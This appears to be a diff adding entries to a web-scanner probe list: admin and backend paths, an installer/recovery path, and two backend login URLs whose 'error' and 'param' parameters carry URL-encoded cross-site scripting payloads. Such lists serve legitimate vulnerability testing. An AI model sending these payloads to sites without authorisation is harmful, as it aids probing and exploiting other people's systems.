@@ -1,0 +1,5 @@
+/admin
+/backend
+/backend/Login?error=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/backend/Login/load/?param=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/public/recovery/install/index.php
